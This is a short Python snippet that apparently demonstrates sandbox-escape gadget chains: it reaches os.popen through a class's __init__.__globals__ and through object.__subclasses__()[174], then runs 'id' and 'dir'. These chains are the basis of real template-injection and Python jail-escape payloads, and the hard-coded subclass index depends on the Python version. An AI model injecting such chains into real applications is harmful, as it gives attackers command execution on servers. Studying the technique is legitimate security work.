import os
class cat():
    def __init__(self):
        pass
print(cat().__class__.__init__.__globals__['os'].popen('id').read())
print('123'.__class__.__mro__[1].__subclasses__()[174].__init__.__globals__['popen']('dir').read())